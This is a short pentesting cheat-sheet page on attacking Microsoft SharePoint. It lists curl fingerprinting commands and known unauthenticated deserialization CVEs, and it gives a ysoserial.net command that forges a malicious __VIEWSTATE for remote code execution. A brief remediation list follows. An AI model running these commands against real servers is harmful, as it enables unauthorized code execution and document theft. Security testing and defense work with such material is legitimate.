---
tags:
  - Web
  - Windows
---

# :material-microsoft-sharepoint: SharePoint

<span class="pill pill-hard">.NET deserialization RCE</span> <span class="pill pill-info">web</span>

Microsoft SharePoint is a .NET app with a steady stream of **unauth deserialization
RCE** CVEs (ToolShell, ViewState) and a huge internal-document attack surface.

!!! abstract "TL;DR"
    Fingerprint the version → match a deserialization CVE (2019-0604, 2020-1147,
    the 2023/2025 ToolShell chain) → or, with a leaked machineKey, forge a
    `__VIEWSTATE` for RCE. Then loot documents/sites.

## :material-magnify: Identify

```bash
curl -sI http://$TARGET/_layouts/15/start.aspx | grep -i microsoftsharepoint
curl -s http://$TARGET/_vti_pvt/service.cnf
curl -s http://$TARGET/_layouts/15/help.aspx        # version banners
# X-SharePointHealthScore / MicrosoftSharePointTeamServices headers
```

## :material-fire: Deserialization RCE CVEs

```text
# CVE-2019-0604   — unauth RCE via XmlSerializer (Picker/ItemPicker)
# CVE-2020-1147   — .NET DataSet deserialization
# CVE-2021-27076  — RCE via list deserialization
# ToolShell (2025) — CVE-2025-53770 unauth RCE chain (on-prem)
# pick by exact version; PoCs use ysoserial.net gadgets
```

!!! loot "Leaked machineKey → ViewState RCE"
    If you find the `machineKey` (config leak, another SharePoint bug), forge a
    malicious `__VIEWSTATE`:
    ```bash
    ysoserial.exe -p ViewState -g TypeConfuseDelegate \
      --generator=<gen> --validationkey=<vk> --validationalg=<alg> -c "cmd /c whoami"
    ```
    See [Deserialization](../web/deserialization.md).

## :material-shield-check: Remediation

- Patch on-prem SharePoint urgently (these are mass-exploited); rotate machineKeys;
  restrict access; AMSI + EDR on the servers.

## :material-link-variant: Related

- Fingerprinted at [Web Technologies](index.md) / [Ports](../network/ports.md).
- ViewState → [Deserialization](../web/deserialization.md); shell → [Windows Privesc](../privesc/windows.md).
- Reference: [HackTricks SharePoint](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html).
